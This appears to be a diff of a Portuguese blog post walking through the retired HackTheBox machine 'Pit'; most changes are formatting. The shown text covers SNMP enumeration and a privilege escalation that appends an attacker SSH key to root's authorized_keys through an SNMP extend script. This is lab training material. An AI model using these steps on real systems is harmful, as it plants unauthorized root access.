@@ -1,28 +1,30 @@
 ---
-date: 2021-09-25 12:00:00
-images: 
-- https://i.imgur.com/pUqq7fY.png
+title: 'Walktrough: HTB Pit'
 language: pt-BR
 localeid: htb-pit
+date: 2021-09-25T12:00:00.000Z
 tags:
-- HackTheBox
-- HTB Medium
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Pit'
-authors: ['default']
+  - HackTheBox
+  - HTB Medium
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/pUqq7fY.png'
+authors:
+  - default
 ---
 
 Olá pessoal!
 
 A máquina desta semana será **Pit**, outra máquina Linux classificada como mediana [Hack The Box](https://www.hackthebox.eu/), criada por [polarbearer](https://app.hackthebox.eu/users/159204) e [GibParadox](https://app.hackthebox.eu/users/125033).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-[info]
+\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+\[info]
 
 ![HTB Pit](https://i.imgur.com/pFwxqgv.png)
 
-Esta máquina foi diferente das demais pois demandou enumeração UDP, não frequentemente necessário porém sempre útil quando não tem muita saída:smile:. SNMP foi chave para enumerar e escalar privilégios nesta máquina, que tinha uma complexidade maior uma vez que possuía SELinux habilitado e não permitiu um shell interativo, até que conseguíssemos credenciais válidas do sistema, conectar via SSH e escalar privilégios.
+Esta máquina foi diferente das demais pois demandou enumeração UDP, não frequentemente necessário porém sempre útil quando não tem muita saída\:smile:. SNMP foi chave para enumerar e escalar privilégios nesta máquina, que tinha uma complexidade maior uma vez que possuía SELinux habilitado e não permitiu um shell interativo, até que conseguíssemos credenciais válidas do sistema, conectar via SSH e escalar privilégios.
 
 ## Enumeração
 
@@ -140,7 +142,7 @@ Acessando as páginas, podemos ver na URI `http://10.10.10.241:80` a página pad
 
 ![HTB Pit - Cockpit login page](https://i.imgur.com/ldyoAq7.png)
 
-Cockpit é uma interface web para administração Linux e, como o nome da máquina é parte do nome da solução, devo estar no caminho correto :smile:.  O domínio `pit.htb` é mencionado como nome da máquina, também incluído no arquivo hosts local.
+Cockpit é uma interface web para administração Linux e, como o nome da máquina é parte do nome da solução, devo estar no caminho correto \:smile:.  O domínio `pit.htb` é mencionado como nome da máquina, também incluído no arquivo hosts local.
 
 Buscando por vulnerabilidades para este produto, encontrei uma vulnerabilidade para SSRF na versão 234 a partir de uma pesquina no  `searchsploit`, que poderia de alguma forma ser útil uma vez que não depende de nenhuma credencial.
 
@@ -185,13 +187,13 @@ for host in "${hosts[@]}"; do
 done
 ```
 
-Avaliando os resultados, encontrei algo interessante: quando acessamos o domínio `dms-pit.htb` recebemos um erro  **403 Forbidden**, cenário ideal para usar a vulnerabilidade de SSRF no Cockpit, se presente :smile:
+Avaliando os resultados, encontrei algo interessante: quando acessamos o domínio `dms-pit.htb` recebemos um erro  **403 Forbidden**, cenário ideal para usar a vulnerabilidade de SSRF no Cockpit, se presente \:smile:
 
 ```plaintext
 http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
 ```
 
-Após alguns testes com a PoC encontrada, notei que a opção "Connect to" mencionada nas notas encontradas não estava presente. Também, inspecionando os videos, notei que a versão que utilizamos foi atualizada e não mais vulneravel, o que também foi confirmado realizando alguns acessos em `/cockpit` sem sucesso :disappointed:.
+Após alguns testes com a PoC encontrada, notei que a opção "Connect to" mencionada nas notas encontradas não estava presente. Também, inspecionando os videos, notei que a versão que utilizamos foi atualizada e não mais vulneravel, o que também foi confirmado realizando alguns acessos em `/cockpit` sem sucesso \:disappointed:.
 
 Reiniciei o processo de enumeração, executando o `nmap` em todas as portas TCP e também executando um scan rápido UDP, buscando por algo que tenha deixado para trás na fase inicial. Também iniciei uma enumeração de diretórios com o `gobuster` diretamente no endereço IP ( `http://10.10.10.241`) para buscar algum website neste servidor publicado.
 
@@ -265,7 +267,7 @@ System uptime
  13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18
 ```
 
-Buscando conhecer mais como enumerar serviços SNMP, encontrei a página [SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)](https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/) que fala sobre alguns comandos úteis enquanto utilizamos o `snmpwalk`. O fato interessante é que, se você especificar o OID até um certo ponto, a ferramenta lista toda informação abaixo daquele nó, uma vez que o SNMP funciona em uma estrutura de árvore conforme imagem abaixo, extraída de Wikimedia.org:
+Buscando conhecer mais como enumerar serviços SNMP, encontrei a página [SNMP\:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)](https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/) que fala sobre alguns comandos úteis enquanto utilizamos o `snmpwalk`. O fato interessante é que, se você especificar o OID até um certo ponto, a ferramenta lista toda informação abaixo daquele nó, uma vez que o SNMP funciona em uma estrutura de árvore conforme imagem abaixo, extraída de Wikimedia.org:
 
 ![HTB Pit - SNMP Tree - source: wikimedia.org](https://i.imgur.com/Gb2LBgj.png)
 
@@ -440,21 +442,21 @@ De acordo com o guia em [SNMP RCE - HackTricks](https://book.hacktricks.xyz/pent
 
 Com base nas informações levantadas, temos uma possível forma de obter acesso `root`, onde os seguintes passos foram utilizados:
 
-- Criei um arquivo  `checkXXXX.sh`, que adiciona uma chave pública como confiável dentro do arquivo `authorized_keys` do perfil que executa o processo e copiado para `/usr/bin/monitor`.
+* Criei um arquivo  `checkXXXX.sh`, que adiciona uma chave pública como confiável dentro do arquivo `authorized_keys` do perfil que executa o processo e copiado para `/usr/bin/monitor`.
 
 ```bash
 #!/bin/bash
 echo "ssh-rsa <base64PubKey> root@kali" >> ~/.ssh/authorized_keys
 ```
 
-- A partir da máquina do atacante, iniciei a ação para executar as ações nsExtendedObject
+* A partir da máquina do atacante, iniciei a ação para executar as ações nsExtendedObject
 
 ```bash
 # Trigger Extended objects
 snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
 
-- Após este ponto, consegui me conectar utilizando a chave privada correspondente via SSH com a conta do usuário `root`, onde consegui obter a flag final.
+* Após este ponto, consegui me conectar utilizando a chave privada correspondente via SSH com a conta do usuário `root`, onde consegui obter a flag final.
 
 ```bash
 $ ssh -i pit root@10.10.10.241
@@ -471,4 +473,4 @@ pit.htb
 
 Espero que tenham gostado!
 
-Vejo vocês no próximo posts :smile:
+Vejo vocês no próximo posts \:smile:
